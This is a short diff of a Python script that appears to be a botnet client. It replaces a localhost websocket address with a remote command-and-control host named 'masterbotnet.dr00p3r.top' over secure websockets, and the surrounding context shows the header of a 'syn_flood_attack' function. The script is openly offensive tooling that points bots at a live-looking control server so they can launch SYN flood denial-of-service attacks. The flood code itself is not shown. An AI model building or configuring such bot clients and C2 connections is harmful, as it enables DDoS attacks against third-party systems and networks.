@@ -12,9 +12,8 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Websocket server address
-URL = 'localhost:5001'
-# Cambiar para producción
-MASTER_URL = f'ws://{URL}'
+URL = 'masterbotnet.dr00p3r.top'
+MASTER_URL = f'wss://{URL}'
 
 # Attack Function - SYN Flood
 async def syn_flood_attack(target, port, count=1000, max_threads=100):
